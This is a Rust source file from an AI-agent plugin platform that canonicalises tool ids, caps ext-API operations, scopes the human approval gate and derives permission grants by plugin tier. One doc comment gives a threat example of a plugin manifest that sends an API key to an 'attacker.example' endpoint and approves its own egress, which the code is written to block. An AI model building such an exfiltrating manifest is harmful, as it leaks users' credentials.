//! Tool id namespaces, canonical ids, approval scope and grants.

use super::*;

/// Name under which the Ghost desktop-automation MCP server (U14) is registered.
/// Ghost declares this server under `mcp_servers` in its plugin manifest
/// (fixtures/ghost.manifest.json) and it registers on activation. Ghost is
/// cross-platform; on a platform where the binary is absent the registry degrades
/// gracefully (a failed spawn is logged-and-skipped, never hiding other servers).
///
/// Canonical server-name constant. Since Ghost moved off `builtin_servers()` its
/// only in-crate references are tests, so the non-test build sees it as unused.
#[allow(dead_code)]
pub const GHOST_SERVER: &str = "ghost";

/// Fully-qualified id of Ghost's recipe-replay tool (`<server>.<tool>`), as the
/// registry namespaces it. One definition so the two kernel callers — the workflow
/// executor's `Recipe` node and the recorder shim in `recipes_host` — cannot drift.
pub const GHOST_RUN_TOOL: &str = "ghost.ghost_run";

/// Name under which the Agent Browser MCP server is registered. Agent Browser is
/// the default web-browsing tool (npm `agentbrowser`, launched via `npx`),
/// declared under `mcp_servers` in its plugin manifest
/// (fixtures/agentbrowser.manifest.json) and registered on activation. Like Ghost,
/// the registry degrades gracefully when the package can't be spawned (not
/// installed / no Node).
///
/// Canonical server-name constant; test-only references in the non-test build now
/// that Agent Browser is manifest-declared rather than a `builtin_servers()` entry.
#[allow(dead_code)]
pub const AGENTBROWSER_SERVER: &str = "agentbrowser";

/// Canonical separator between server name and tool name in a fully-qualified
/// tool id. Legacy double-underscore ids remain readable at the compatibility
/// boundary, but newly generated ids use this separator.
pub(super) const TOOL_ID_SEP: &str = ".";
pub(super) const LEGACY_TOOL_ID_SEP: &str = "__";
const LEGACY_EXT_TOOL_PREFIX: &str = "ryu_ext__";

/// Synthetic "server" name for tools an enabled plugin re-exposes
/// (tool-as-Runnable, M3). These ids look like `app.<target-tool-id>` and are
/// dispatched by aliasing to the target — see `call_tool_with_user`.
pub(super) const APP_TOOL_SERVER: &str = "app";
const LEGACY_APP_TOOL_PREFIX: &str = "app__";

/// Id prefix for app-registered tools (`APP_TOOL_SERVER` + `TOOL_ID_SEP`).
pub(super) const APP_TOOL_PREFIX: &str = "app.";

/// Most derived ext-API operations one app may contribute
/// ([`McpRegistry::set_ext_api_routes`]).
///
/// Sized against what a *human* can be expected to have reviewed: an app whose
/// spec lowers past this is exposing its whole internal surface, not an intended
/// tool set, and the right fix is to narrow its manifest `http.routes` rather than
/// to raise this number. 60 is comfortably above every first-party sidecar's
/// declared surface today, so the cap is a guardrail and not a routine truncation.
///
/// **This is the EXPOSURE cap, and it is applied here — after the fetch hook's
/// declared-route filter — on purpose.** The importer takes a cap too, but capping
/// there would spend the 60-operation budget on operations that `ext_api::lower` is
/// about to discard as undeclared: a declared operation could be truncated away while
/// an undeclared one consumed its slot, and nothing would say so. The hook therefore
/// imports against a much larger *parse* ceiling and lets this cap truncate the set
/// that actually survived. See `manifest_sidecar::EXT_API_SPEC_OP_CEILING`.
pub(super) const EXT_API_PER_PLUGIN_CAP: usize = 60;

/// Most derived ext-API operations the whole node may hold.
///
/// The per-plugin cap alone does not bound the node: derived rows are scored by
/// the ranker on **every** `tool_search`, so cost is the node-wide total, and
/// seven installed apps each politely under 60 is already 420 rows per search.
pub(super) const EXT_API_GLOBAL_CAP: usize = 400;

/// **The derived-route keying invariant, in one predicate.** Does map key `key`
/// belong to `plugin_id`?
///
/// The map is keyed per SIDECAR (`<plugin_id>/<spec.name>`, from
/// [`crate::sidecar::manifest_sidecar::namespaced_name`]) because that is the unit the
/// lowering hook is armed at, while three callers — the plugin-scoped clear, the
/// plugin-scoped read model, and the per-plugin cap — ask a *plugin* question. This is
/// the single place that translates between the two; deriving ownership a second way
/// (parsing the key, or reading it back off `routes[0].plugin_id`) is what would let
/// the clear and the cap drift apart, and an entry stored with ZERO routes has no
/// `routes[0]` to read at all.
///
/// The trailing slash is the non-obvious half: without it `@ryu/crm` would also claim
/// `@ryu/crm-plus`'s rows, so disabling one app would silently strip another's tools.
/// The equality arm covers the degenerate single-contribution form
/// ([`McpRegistry::set_ext_api_routes`]), where the key IS the plugin id.
pub(super) fn ext_api_key_owned_by(key: &str, plugin_id: &str) -> bool {
    key == plugin_id
        || (key.len() > plugin_id.len()
            && key.starts_with(plugin_id)
            && key.as_bytes()[plugin_id.len()] == b'/')
}

/// Convert a legacy fully-qualified tool id to the canonical dotted form.
///
/// This is deliberately a boundary conversion rather than a manifest rewrite:
/// installed plugins and saved agent allowlists can still contain the historical
/// `server__tool` spelling, while every new registry row and dispatch decision uses
/// `server.tool`. Only the namespace separator is converted for ordinary ids, so a
/// tool name that legitimately contains `__` remains the same tool. The historical
/// ext-API ids had two namespace separators (`ryu_ext__plugin__operation`), so that
/// known producer shape is normalized explicitly as well.
pub(crate) fn canonical_tool_id(id: &str) -> String {
    if let Some(rest) = id.strip_prefix(LEGACY_EXT_TOOL_PREFIX) {
        if let Some((plugin, operation)) = rest.split_once(LEGACY_TOOL_ID_SEP) {
            return format!("ryu_ext{TOOL_ID_SEP}{plugin}{TOOL_ID_SEP}{operation}");
        }
        return format!("ryu_ext{TOOL_ID_SEP}{rest}");
    }
    // Catalog server keys commonly use a slash (`io.github.acme/files`). In
    // that shape a dunder after the slash is the old namespace separator when
    // no canonical server/tool dot appears after the slash. A canonical tool
    // name may itself contain a dunder, so preserve that form.
    if let Some(legacy) = id.find(LEGACY_TOOL_ID_SEP) {
        let slash = id[..legacy].rfind('/');
        let canonical_tool_separator = slash
            .map(|slash| id[slash + 1..legacy].contains(TOOL_ID_SEP))
            .unwrap_or(false);
        if slash.is_some() && !canonical_tool_separator {
            return format!(
                "{}{TOOL_ID_SEP}{}",
                &id[..legacy],
                &id[legacy + LEGACY_TOOL_ID_SEP.len()..]
            );
        }
    }
    // A canonical id may still contain the legacy characters inside its tool
    // name (for example `web.search__preview`). Only translate a legacy
    // namespace when its separator appears before the first canonical dot;
    // otherwise the dot already proves that the prefix is canonical.
    if let Some(dot) = id.find(TOOL_ID_SEP) {
        if let Some(legacy) = id.find(LEGACY_TOOL_ID_SEP) {
            if dot < legacy {
                return id.to_owned();
            }
        }
    }
    id.split_once(LEGACY_TOOL_ID_SEP)
        .map(|(server, tool)| format!("{server}{TOOL_ID_SEP}{tool}"))
        .unwrap_or_else(|| id.to_owned())
}

pub(super) fn is_app_tool_id(id: &str) -> bool {
    id.starts_with(APP_TOOL_PREFIX) || id.starts_with(LEGACY_APP_TOOL_PREFIX)
}

/// The id under which a Tool runnable is REGISTERED and dispatched — the single
/// source of truth both registration (server handler) and resolution
/// (`resolve_app_tool_backend`) call, so they can never disagree.
///
/// A declarative tool plugin that ships NEW behavior (a non-`Alias` backend) AND
/// already namespaces its slug with either the canonical or legacy tool-id
/// separator keeps its native namespace (`exa.search`, `spider.crawl`, `rtk.run`),
/// after the legacy spelling is normalized. This lets old manifests continue to
/// work while new manifests expose only dotted ids.
///
/// Everything else stays `app.<slug>`: an `Alias` tool (the other-apps re-expose
/// path, which MUST keep the prefix), or a bare slug lacking the namespace
/// separator that `split_tool_id` requires (a native id without a separator is
/// unroutable, so `weather` correctly stays `app.weather`). This preserves the
/// exact current behavior for every non-namespaced declarative tool.
pub(crate) fn app_tool_registered_id(cfg: &crate::plugin_manifest::schema::ToolConfig) -> String {
    use crate::plugin_manifest::schema::ToolBackend;
    let slug = canonical_tool_id(&cfg.slug);
    match cfg.resolve_backend() {
        Ok(backend)
            if !matches!(backend, ToolBackend::Alias { .. })
                && (cfg.slug.contains(TOOL_ID_SEP) || cfg.slug.contains(LEGACY_TOOL_ID_SEP))
                // A slug in a Core built-in server namespace (`channel.send`) must
                // not claim that native id; it stays under `app.<slug>`.
                && !builtin_servers::is_builtin_server_id(&slug) =>
        {
            slug
        }
        _ => format!("{APP_TOOL_PREFIX}{slug}"),
    }
}

/// The `skills.*` ids that are genuinely callable functions, sourced from the
/// `skills` provider's own exported constants rather than re-spelled here.
///
/// These three are what [`skills_tool::dispatch`] has match arms for (`search` /
/// `load` / `author`, after `split_tool_id` strips the server segment) and what
/// [`skills_tool::tools`] advertises. Every other id under the `skills` server is a
/// **catalog id** — a `skills.<slug>` discovery row for an Agent Skill, which
/// `dispatch`'s fallthrough refuses.
///
/// **Cross-file dependency, stated deliberately:** this list and the refusal it
/// depends on live in `skills_tool.rs`, not here. A drift guard test asserts
/// `skills_tool::tools()` is a subset of this list. That direction is the
/// load-bearing one: a new *callable* `skills.*` tool landing without a matching
/// entry here would be classified as a catalog id and silently skip the approval
/// gate — and `skills.author` already writes files into the shared skills
/// directory, so an un-gated sibling of it would be a real hole. The opposite drift
/// (a catalog id mistaken for a tool) merely restores today's behaviour: a dead
/// approval, which is what this whole change removes.
///
/// The residual the subset test cannot see: a tool given a `dispatch` match arm but
/// never advertised by `tools()` would pass the guard and lose its gate. `tools()`
/// is a proxy for the authority (`dispatch`'s arms), not the authority — they name
/// the same three tools today, and the guard is the mechanical half of keeping it
/// that way.
const SKILLS_CALLABLE_TOOL_IDS: [&str; 3] = [
    skills_tool::SEARCH_TOOL_ID,
    skills_tool::LOAD_TOOL_ID,
    skills_tool::AUTHOR_TOOL_ID,
];

/// Whether the human-in-the-loop approval gate should run for this tool id.
///
/// `false` for exactly one shape: a `skills.<slug>` **catalog** id. Approving one
/// cannot make it run — it is a discovery row, not a function — so queuing an
/// approval for it puts a pending item in the user's inbox that can only ever
/// resolve to `skills_tool::dispatch`'s refusal. See the call site in
/// [`McpRegistry::call_tool_with_identity`] for the full reasoning.
///
/// The comparison is on the WHOLE id after confirming the server segment, because
/// [`McpRegistry::split_tool_id`] splits the first namespace separator:
/// `skills.a__b` has server `skills` and tool `a__b`, which is a slug containing
/// the legacy separator and correctly remains a catalog id, while `skills.search`
/// matches a callable id exactly.
/// An id with no separator at all (`skills`) is not routable to this provider and
/// stays gated.
///
/// The call site passes the **resolved** `gate_id`, not the raw `tool_id` — the
/// same value the gate classifies risk on. That is deliberate and mirrors the
/// alias rule directly above it: an `app.…` tool whose manifest-fixed alias target
/// is a `skills.<slug>` catalog id resolves to that id here and is skipped for
/// exactly the same reason (the resolved call can only refuse), while an alias onto
/// a real `skills.*` tool keeps its gate.
pub(crate) fn approval_gate_applies(tool_id: &str) -> bool {
    let normalized = canonical_tool_id(tool_id);
    match McpRegistry::split_tool_id(&normalized) {
        Some((server, _)) if server == skills_tool::SERVER_NAME => {
            SKILLS_CALLABLE_TOOL_IDS.contains(&normalized.as_str())
        }
        _ => true,
    }
}

/// The grant set an app tool actually runs with — the enforcement input for
/// `tool:http-egress:<domain>`, `tool:command:<bin>` and the sandbox `host.*` verbs.
///
/// **Core**-tier reads the manifest's declared `permission_grants`; **Community**-tier
/// reads ONLY the record's Gateway-approved grants.
///
/// # Why the tier split rather than "always the record"
///
/// A manifest's `permission_grants` is a self-declaration. For a plugin loaded from
/// the user-writable `~/.ryu/plugins` that made the egress grant self-attested: a
/// manifest could pair `url: "https://attacker.example/collect"` +
/// `secret_headers: {"X-K": "env:ANTHROPIC_API_KEY"}` with
/// `permission_grants: ["tool:http-egress:attacker.example"]` and pass its own gate.
/// Reading `approved_grants` turns both `tool:*` families back into *approved*
/// capabilities — the Gateway's default allowlist admits exactly
/// `tool:http-egress:api.exa.ai`, `tool:http-egress:127.0.0.1`,
/// `tool:command:spider`, `tool:command:rtk`, and `tool:command:rg`, and `tool` is
/// a reserved namespace there so nothing else can be owner-scope self-approved.
///
/// Core-tier keeps reading the manifest because a Core-tier manifest IS trusted
/// input (compiled-in fixtures; the loader parses built-ins first and
/// first-occurrence-wins, so a disk manifest can never claim a Core id) AND because
/// its record frequently carries no grants at all: the pre-installed seed
/// (`plugins/seed.rs`) writes a fixed grant list that is EMPTY for everything
/// outside `seed_overrides` — including `spider` (`tool:command:spider`) and
/// `shadow` (`tool:http-egress:127.0.0.1`). Sourcing those from the record would
/// break first-party tools on every fresh install. Community-tier plugins reach
/// `enabled` only through `plugins::lifecycle::enable_app`, which populates
/// `approved_grants` from the Gateway's validation, so the tightened path always
/// has real data to read.
pub(super) fn effective_tool_grants(
    manifest: &PluginManifest,
    approved_grants: &[String],
) -> std::collections::HashSet<String> {
    match crate::plugins::builtins::tier_for_manifest(manifest) {
        crate::plugin_manifest::PluginTier::Core => {
            manifest.permission_grants.iter().cloned().collect()
        }
        crate::plugin_manifest::PluginTier::Community => manifest
            .approved_permission_grants(approved_grants)
            .into_iter()
            .collect(),
    }
}

/// A plugin app tool resolved to its dispatch-ready backend + the owning plugin's
/// grant set. Produced by [`McpRegistry::resolve_app_tool_backend`] from the LIVE
/// enabled-manifest set. The grant set comes from [`effective_tool_grants`]: the
/// record's Gateway-approved grants for a Community-tier plugin, the manifest's
/// declaration for a Core-tier one. Hooks independently use the installed
/// record's approved grants, including for built-in manifests.
/// Stamp `provider` onto an adapter's returned envelope, matching what
/// `capability_tools::map_response` writes on the declarative path.
///
/// An adapter that already reported a provider is left alone (it may be proxying
/// and know better); a non-object result is wrapped rather than discarded, so a
/// verb whose canonical result is a bare array or scalar still reports who served
/// it instead of silently losing the field.
pub(super) fn stamp_provider(result: Value, provider_id: &str) -> Value {
    match result {
        Value::Object(mut map) => {
            map.entry("provider".to_owned())
                .or_insert_with(|| Value::String(provider_id.to_owned()));
            Value::Object(map)
        }
        other => {
            let mut map = serde_json::Map::new();
            map.insert("provider".to_owned(), Value::String(provider_id.to_owned()));
            map.insert("raw".to_owned(), other);
            Value::Object(map)
        }
    }
}

#[cfg(test)]
#[path = "tests/tool_ids.rs"]
mod tests;
